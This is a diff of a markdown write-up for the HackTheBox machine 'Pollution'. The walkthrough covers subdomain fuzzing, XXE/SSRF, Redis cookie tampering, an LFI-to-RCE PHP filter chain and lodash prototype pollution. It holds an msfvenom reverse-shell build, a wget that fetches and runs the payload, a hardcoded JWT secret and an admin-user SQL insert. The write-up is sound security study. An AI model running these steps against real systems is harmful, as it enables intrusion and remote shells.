@@ -14,7 +14,6 @@ TOC: true
 # Overview
 
 Pollution is an awesome and difficult Linux box focusing around an interesting choice for a tech stack. A combination of a PHP site handled with PHP FPM and a NodeJS API says it all. This box had me going through all of my web knowledge in order to fully compromise the machine.
-
 The box begins with fuzzing for subdomains. One of which contains a log with information on gaining a admin account on the initial website. Admins have access to an API endpoint vulnerable to XXE. Chain this with SSRF and you can gain access to local files through out of bands exfiltration. Snoop around and you eventually find the password to the other subdomain and a password to the Redis database. Adjust your own cookie handled by the database to bypass authentication to the third site. Use the LFI to RCE chain to gain our first shell. Exploit FastCGI on port 9000 and we are able to pivot to Victor. For the final stretch of the machine, perform prototype pollution on the API to gain a root shell.
 
 # Reconnaissance
@@ -46,11 +45,9 @@ Looks like a custom web application capable of handling registering for an accou
 
 ### Subdomains
 
-<details open>
-<summary>Command</summary>
+- Command:
+    
     `gobuster vhost -u [http://collect.htb/](http://collect.htb/) -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain`
-</details>
-
     
 
 ```jsx
@@ -77,11 +74,9 @@ Found: developers.collect.htb Status: 401 [Size: 469]
 
 ### Directories
 
-<details open>
-<summary>Command</summary>
+- Command:
+    
     `gobuster dir -u [http://collect.htb/](http://collect.htb/) -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -r --exclude-length 26197`
-</details>
-
     
 
 ```jsx
@@ -113,11 +108,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 ```
 
-<details open>
-<summary>Note to self while enumerating websites</summary>
-    Directories: When attempting to fuzz for directories on a website that redirects a lot, use the `-r` flag in `gobuster` and see where it goes to. Take that content length and exclude it with `--exclude-length` XXX characters.
-    Vhosts: Not sure if this was a one off thing but I’ve been noticing that while debugging vhost fuzzing with `gobuster` they don’t append the rest of the domain. To get around this use the `--append-domain` flag and you will eventually find what you are looking for if it exists.
-</details>
+- Note to self while enumerating websites
+    
+    **Directories:** When attempting to fuzz for directories on a website that redirects a lot, use the `-r` flag in `gobuster` and see where it goes to. Take that content length and exclude it with `--exclude-length` XXX characters.
+    
+    **Vhosts**: Not sure if this was a one off thing but I’ve been noticing that while debugging vhost fuzzing with `gobuster` they don’t append the rest of the domain. To get around this use the `--append-domain` flag and you will eventually find what you are looking for if it exists.
     
 
 ### Developers site
@@ -302,12 +297,10 @@ My suspicions were correct, there is an `.htaccess` file for this domain. The de
 
 This payload worked and we have the contents of the `.htpasswd` file. The username is `developers_group` and the password can hopefully be cracked using a tool like `john`. I tried Hashcat  however, it wouldn’t take the hash.
 
+- Command
     
-<details open>
-<summary>Command</summary>
-    `john hash --wordlist=/usr/share/wordlists/rockyou.txt` 
-</details>
-
+    `john hash --wordlist=/usr/share/wordlists/rockyou.txt`
+    
 
 <aside>
 ❕ **Information**
@@ -341,16 +334,17 @@ This section in the `index.php` sticks out to me. We’ll revisit this later.
 
 ## Redis Database
 
-<details open>
-<summary>Quick Redis Cheat Sheet</summary>
-    `PING`: Responds with PONG if you are authenticated   
-    `INFO KEYSPACE`: Information regarding keys  
+- **Quick Redis Cheat Sheet**
+    
+    `PING`: Responds with PONG if you are authenticated
+    
+    `INFO KEYSPACE`: Information regarding keys
+    
     `KEYS *`: Shows all keys
+    
     `GET <KEY>`: Outputs the information stored in the key
+    
     `SET <KEY>`: Change key value
-</details>
-
-
     
 
 *First time using a Redis database, I used mainly these commands*
@@ -407,12 +401,10 @@ Possible LFI on a PHP site! LFI → PHP RCE Chain is a valid candidate to test.
 
 Initial tests with standard LFI payloads is not displaying anything but since this is a PHP site, I jumped the gun and went straight for the chain. There is a nice [tool](https://github.com/synacktiv/php_filter_chain_generator) that can generate chains for us and this was the the command I used:
 
-
-<details open>
-<summary>Command</summary>
-    `python3 lfi.py --chain '<?php system("whoami"); ?>'`
-</details>
-
+- Command
+    
+    `python3 [lfi.py](http://lfi.py/) --chain '<?php system("whoami"); ?>'`
+    
 
 [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
 
@@ -430,27 +422,21 @@ We need to find a way to shorten this code to allow myself to upload a shell. Ap
 
 With this chain of commands, I was able to get RCE:
 
-
-<details open>
-<summary>Create msfvenom payload</summary>
+- Create msfvenom payload
+    
     `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.152 LPORT=4444 -f elf > a`
-</details>
-
-<details open>
-<summary>Drop payload on disk</summary>
-    `python3 lfi.py --chain '<?= `wget 10.10.14.152/a -O /tmp/a`; ?>'`
-</details>
-
-<details open>
-<summary>Change permissions</summary>
-    `python3 lfi.py --chain '<?= `chmod 777 /tmp/a`; ?>'`
-</details>
-
-<details open>
-<summary>Activate</summary>
-    `python3 lfi.py --chain '<?= `/tmp/a`; ?>'`
-</details>
-
+    
+- Drop payload on disk
+    
+    `python3 [lfi.py](http://lfi.py/) --chain '<?= `wget 10.10.14.152/a -O /tmp/a`; ?>'`
+    
+- Change permissions
+    
+    `python3 [lfi.py](http://lfi.py/) --chain '<?= `chmod 777 /tmp/a`; ?>'`
+    
+- Activate
+    
+    `python3 [lfi.py](http://lfi.py/) --chain '<?= `/tmp/a`; ?>'`
     
 
 With all that, we finally have access to the network :)  
@@ -569,6 +555,198 @@ root    1364  0.0  1.8 1663556 75120  /usr/bin/node /root/pollution_api/index.js
 
 Although the process is run as root, it’s Victor, our current user, who is the owner of the file. Regardless, lets take a look at the API’s source code.
 
+- `routes/documentation.js`
+    
+    ```bash
+    const express = require('express');
+    const router = express.Router();
+    
+    router.get('/',(req,res)=>{
+        res.json({
+            Documentation: {
+                Routes: {
+                    "/": {
+                        Methods: "GET",
+                        Params: null
+                    },
+                    "/auth/register": {
+                        Methods: "POST",
+                        Params: {
+                            username: "user",
+                            password: "pass"
+                        }
+                    },
+                    "/auth/login": {
+                        Methods: "POST",
+                        Params: {
+                            username: "user",
+                            password: "pass"
+                        }
+                    },
+                    "/client": {
+                        Methods: "GET",
+                        Params: null
+                    },
+                    "/admin/messages": {
+                        Methods: "POST",
+                        Params: {
+                            id: "messageid"
+                        }
+                    },
+                    "/admin/messages/send": {
+                        Methods: "POST",
+                        Params: {
+                            text: "message text"
+                        }
+                    }
+                }
+            }
+    ```
+    
+- `functions/jwt.js`
+    
+    ```bash
+    const jwt = require('jsonwebtoken');
+    const SECRET = "JWT_COLLECT_124_SECRET_KEY"
+    
+    const signtoken = (payload)=>{
+        const token = jwt.sign(payload, SECRET, { expiresIn: 3600 });
+        return token;
+    }
+    
+    const decodejwt = (token)=>{
+        return jwt.verify(token, SECRET, (err, decoded)=>{
+            if(err) return false;
+            return decoded;
+        });
+    }
+    
+    module.exports = { signtoken, decodejwt};
+    ```
+    
+- `routes/auth.js`
+    
+    ```bash
+    const express = require('express');
+    const router = express.Router();
+    const User = require('../models/User');
+    const { decodejwt } = require('../functions/jwt')
+    
+    //controllers
+    const { messages } = require('../controllers/Messages');
+    const { messages_send } = require('../controllers/Messages_send');
+    
+    router.use('/', async(req,res,next)=>{
+        if(req.headers["x-access-token"]){
+            const token = decodejwt(req.headers["x-access-token"]);
+            if(token){
+                const find = await User.findAll({where: {username: token.user, role: token.role}});           
+                if(find.length > 0){
+                    if(find[0].username == token.user && find[0].role == token.role && token.role == "admin"){
+                        return next();
+                    }
+                    return res.json({Status: "Error", Message: "You are not allowed"});
+                }
+                return res.json({Status: "Error", Message: "You are not allowed"});
+            }
+            return res.json({Status: "Error", Message: "You are not allowed"});
+        }
+        return res.json({Status: "Error", Message: "You are not allowed"});
+    })
+    
+    router.get('/',(req,res)=>{
+        res.json({Status: "Ok", Message: 'Read documentation from api in /documentation'});
+    })
+    
+    router.post('/messages',messages);
+    router.post('/messages/send', messages_send);
+    module.exports = router;
+    ```
+    
+- `routes/admin.js`
+    
+    ```jsx
+    const express = require('express');
+    const router = express.Router();
+    const User = require('../models/User');
+    const { decodejwt } = require('../functions/jwt')
+    
+    //controllers
+    
+    const { messages } = require('../controllers/Messages');
+    const { messages_send } = require('../controllers/Messages_send');
+    
+    router.use('/', async(req,res,next)=>{
+        if(req.headers["x-access-token"]){
+    
+            const token = decodejwt(req.headers["x-access-token"]);
+            if(token){
+                const find = await User.findAll({where: {username: token.user, role: token.role}});
+                
+                if(find.length > 0){
+    
+                    if(find[0].username == token.user && find[0].role == token.role && token.role == "admin"){
+    
+                        return next();
+    
+                    }
+    
+                    return res.json({Status: "Error", Message: "You are not allowed"});
+                }
+    
+                return res.json({Status: "Error", Message: "You are not allowed"});
+            }
+    
+            return res.json({Status: "Error", Message: "You are not allowed"});
+        }
+    
+        return res.json({Status: "Error", Message: "You are not allowed"});
+    })
+    
+    router.get('/',(req,res)=>{
+        res.json({Status: "Ok", Message: 'Read documentation from api in /documentation'});
+    })
+    
+    router.post('/messages',messages);
+    router.post('/messages/send', messages_send);
+    
+    module.exports = router;
+    ```
+    
+- `controllers/Send_messages.js`
+    
+    ```bash
+    const Message = require('../models/Message');
+    const { decodejwt } = require('../functions/jwt');
+    const _ = require('lodash');
+    const { exec } = require('child_process');
+    
+    const messages_send = async(req,res)=>{
+        const token = decodejwt(req.headers['x-access-token'])
+        if(req.body.text){
+            const message = {
+                user_sent: token.user,
+                title: "Message for admins",
+            };
+    
+            _.merge(message, req.body);
+    
+            exec('/home/victor/pollution_api/log.sh log_message');
+    
+            Message.create({
+                text: JSON.stringify(message),
+                user_sent: token.user
+            });
+            return res.json({Status: "Ok"});
+        }
+        return res.json({Status: "Error", Message: "Parameter text not found"});
+    }
+    
+    module.exports = { messages_send };
+    ```
+    
+
+Alright that’s a lot of files listed, but let me save you from the pain I suffered from staring between these JavaScript files for a couple hours.
 
 <aside>
 ❕ **Information**
@@ -594,13 +772,13 @@ It looks like we need an admin role in order to access some parts of the API and
 ```jsx
 const { exec } = require('child_process');
 ...
-    _.merge(message, req.body);
-    exec('/home/victor/pollution_api/log.sh log_message');
+		_.merge(message, req.body);
+		exec('/home/victor/pollution_api/log.sh log_message');
 ```
 
 <aside>
 ❓ **What so important about this excerpt?**
-After luckily landing on XCT’s video about Unobtanium, he mentioned that there is a specific vulnerability in JavaScript regarding the _.merge function.
+After luckily landing on XCT’s video regarding Unobtanium, he mentioned that there is a specific vulnerability in JavaScript regarding the _.merge function.
 
 </aside>
 
@@ -614,10 +792,9 @@ Well, our attack chain is going to be quite an interesting one but here is the a
 
 First create user in MariaDB
 
-<details open>
-<summary>Command</summary>
+- Command
+    
     `INSERT INTO users (username, password, role, createdAt, updatedAt) VALUES ('admin', 'password123', 'admin', NOW(), NOW());`
-</details>
     
 
 ![](https://i.imgur.com/k7YnvOB.png)
@@ -626,11 +803,10 @@ Ignore the first user, that was me testing the registration endpoint mentioned i
 
 *Note that I used chisel to port forward traffic from 3000 to my 3000.*
 
-<details open>
-<summary>Command</summary>
+- Command
+    
     `curl localhost:3000/auth/login -X POST -d '{"username": "admin", "password": "password123"}' -H "Content-Type: application/json"`
-</details>
-
+    
 
 ```jsx
 Status	:	Ok
